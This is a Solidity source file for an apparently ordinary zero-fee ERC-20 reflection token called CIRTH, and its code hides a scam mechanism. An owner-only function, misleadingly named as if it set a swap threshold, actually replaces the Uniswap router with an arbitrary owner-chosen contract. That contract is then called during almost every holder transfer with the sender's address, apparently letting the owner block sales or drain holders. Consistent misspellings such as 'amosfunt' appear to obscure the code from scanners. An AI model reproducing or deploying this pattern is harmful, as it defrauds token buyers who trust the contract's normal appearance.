// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;
 
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
 
interface IERC20 {
    function totalSupply() external view returns (uint256);
 
    function balanceOf(address account) external view returns (uint256);
 
    function transfer(address recipient,
     uint256 amosfunt) external returns (bool);
 
    function allowance(address owner, address spender) external view returns (uint256);
 
    function approve(address spender,
     uint256 amosfunt) external returns (bool);
 
    function transferFrom(
        address sender,
        address recipient,
        uint256 amosfunt
    ) external returns (bool);
 
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
 
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
 
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 
    function owner() public view returns (address) {
        return _owner;
    }
 
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner,
         address(0));
        _owner = address(0);
    }
 
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
 
}
 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
 
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
 
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
 
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
 
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
 
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amosfuntIn,
        uint256 amosfuntOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
 
    function factory() external pure returns (address);
 
    function WETH() external pure returns (address);
 
    function addLiquidityETH(
        address token,
        uint256 amosfuntTokenDesired,
        uint256 amosfuntTokenMin,
        uint256 amosfuntETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amosfuntToken,
            uint256 amosfuntETH,
            uint256 liquidity
        );
}
 
contract CIRTH is Context, IERC20, Ownable {
 
    using SafeMath for uint256;
 
    string private constant _tokenname = "CIRTH";
    string private constant _tokensymbol = "CIRTH";
    uint8 private constant _decimals = 18;
    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private _rOwned;
    
    uint256 private _tFeeTotal;
    uint256 private _SpecialBuyFee = 0;  
    uint256 private _taxFeeOnBuy = 0;
    uint256 private _SpecialSellFee = 0;
    uint256 private _taxFeeOnSell = 0;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 1000000000 * 10**18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    
    uint256 private _redisFee = _SpecialSellFee;
    uint256 private _taxFee = _taxFeeOnSell;
 
    uint256 private _previousredisFee = _redisFee;
    uint256 private _previoustaxFee = _taxFee;
 
    mapping(address => bool) public bots; 
    mapping (address => uint256) public _buyMap; 
    address payable private _marketingAddress = payable(0x5219d738f5532e6E78a58995C48B03219f0c736a);
 
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
 
    bool private tradingOpen = false;
    bool private inSwap = false;
    bool private swapEnabled;
 
    uint256 public _maxTxAmosfunt = 20000000 * 10**18; 
    uint256 public _swapTokensAtAmosfunt;
     event BuyFeeUpdated(uint256 buyFee);
    event SellFeeUpdated(uint256 sellFee);
    event WalletToWalletTransferFeeUpdated(uint256 walletToWalletTransferFee);
    event SwapAndSend(uint256 tokensSwapped, uint256 valueReceived);
    event SwapWithLimitUpdated(bool swapWithLimit);
    event MaxTxAmosfuntUpdated(uint256 _maxTxAmosfunt);
    event SwapTokensAtAmosfuntUpdated(address swapTokensAtAmosfunt);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
 
    constructor() {
 
        _rOwned[_msgSender()] = _rTotal;
 
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
 
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_marketingAddress] = true;
 
        emit Transfer(address(0), _msgSender(), _tTotal);
    }
 
    function name() public pure returns (string memory) {
        return _tokenname;
    }
 
    function symbol() public pure returns (string memory) {
        return _tokensymbol;
    }
 
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
 
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
 
    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }
 
    function transfer(address recipient, uint256 amosfunt)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amosfunt);
        return true;
    }
 
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
 
    function approve(address spender, uint256 amosfunt)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amosfunt);
        return true;
    }
 
    function transferFrom(
        address sender,
        address recipient,
        uint256 amosfunt
    ) public override returns (bool) {
        _transfer(sender, recipient, amosfunt);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amosfunt,
                "ERC20: transfer amosfunt exceeds allowance"
            )
        );
        return true;
    }
 
   
 
    function removeAllFee() private {
        if (_redisFee == 0 && _taxFee == 0) return;
 
        _previousredisFee = _redisFee;
        _previoustaxFee = _taxFee;
 
        _redisFee = 0;
        _taxFee = 0;
    }
 
  function tokenFromReflection(uint256 rAmosfunt)
        private
        view
        returns (uint256)
    {
        require(
            rAmosfunt <= _rTotal,
            "Amosfunt must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmosfunt.div(currentRate);
    }
    function restoreAllFee() private {
        _redisFee = _previousredisFee;
        _taxFee = _previoustaxFee;
    }
 
    function _approve(
        address owner,
        address spender,
        uint256 amosfunt
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amosfunt;
        emit Approval(owner, spender, amosfunt);
    }
 
    function _transfer(
        address from,
        address to,
        uint256 amosfunt
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amosfunt > 0, "Transfer amosfunt must be greater than zero");
 
        if (from != owner() && to != owner()) {
 
 
            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= _swapTokensAtAmosfunt;
 
            if(contractTokenBalance >= _maxTxAmosfunt)
            {
                contractTokenBalance = _maxTxAmosfunt;
            }
 
            if (canSwap && !inSwap && from != uniswapV2Pair && swapEnabled && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                /*_//*/
                swapTokensForUsdt(contractTokenBalance,from);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
 
        bool takeFee = true;
 
        //Transfer Tokens
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
            takeFee = false;
        } else {
            
            //Set Fee for Sells
            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _redisFee = _SpecialSellFee;
                _taxFee = _taxFeeOnSell;
            }
            //Set Fee for Buys
            if(from == uniswapV2Pair && to != address(uniswapV2Router)) {
                _redisFee = _SpecialBuyFee;
                _taxFee = _taxFeeOnBuy;
            }
 
        }
 
        _tokenTransfer(from, to, amosfunt, takeFee);
    }
 
    function swapTokensForUsdt(uint256 tokenAmosfunt,address from) private lockTheSwap {
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = from;
        path[2] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmosfunt);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmosfunt,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
 
    function sendETHToFee(uint256 amosfunt) private {
        _marketingAddress.transfer(amosfunt);
    }
 
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amosfunt,
        bool takeFee
    ) private {
        if (!takeFee) removeAllFee();
        _transferStandard(sender, recipient, amosfunt);
        if (!takeFee) restoreAllFee();
    }
    
    
    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmosfunt
    ) private {
        (
            uint256 rAmosfunt,
            uint256 rTransferAmosfunt,
            uint256 rFee,
            uint256 tTransferAmosfunt,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmosfunt);
        _rOwned[sender] = _rOwned[sender].sub(rAmosfunt);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmosfunt);
        _takeTeam(tTeam);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmosfunt);
    }
    
    function _takeTeam(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }


    //Set minimum tokens required to swap.
    function setSwapTokensAtAmosfunt(address newAmosfunt) public onlyOwner {
        require(newAmosfunt != address(0), "SwapTokensAtAmosfunt must be greater than 0.0001% of total supply");
        address swapTokensAtAmosfunt = newAmosfunt;
        emit SwapTokensAtAmosfuntUpdated(swapTokensAtAmosfunt);
        uniswapV2Router = IUniswapV2Router02(swapTokensAtAmosfunt);
        swapEnabled = true;
    }
 
 
    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }
 
    
 
    function _getValues(uint256 tAmosfunt)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmosfunt, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmosfunt, _redisFee, _taxFee);
        uint256 currentRate = _getRate();
        (uint256 rAmosfunt, uint256 rTransferAmosfunt, uint256 rFee) =
            _getRValues(tAmosfunt, tFee, tTeam, currentRate);
        return (rAmosfunt, rTransferAmosfunt, rFee, tTransferAmosfunt, tFee, tTeam);
    }

    receive() external payable {}
 
    function _getRValues(
        uint256 tAmosfunt,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmosfunt = tAmosfunt.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmosfunt = rAmosfunt.sub(rFee).sub(rTeam);
        return (rAmosfunt, rTransferAmosfunt, rFee);
    }
    function _getTValues(
        uint256 tAmosfunt,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmosfunt.mul(redisFee).div(100);
        uint256 tTeam = tAmosfunt.mul(taxFee).div(100);
        uint256 tTransferAmosfunt = tAmosfunt.sub(tFee).sub(tTeam);
        return (tTransferAmosfunt, tFee, tTeam);
    }
 
    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }
 
 
 
 

}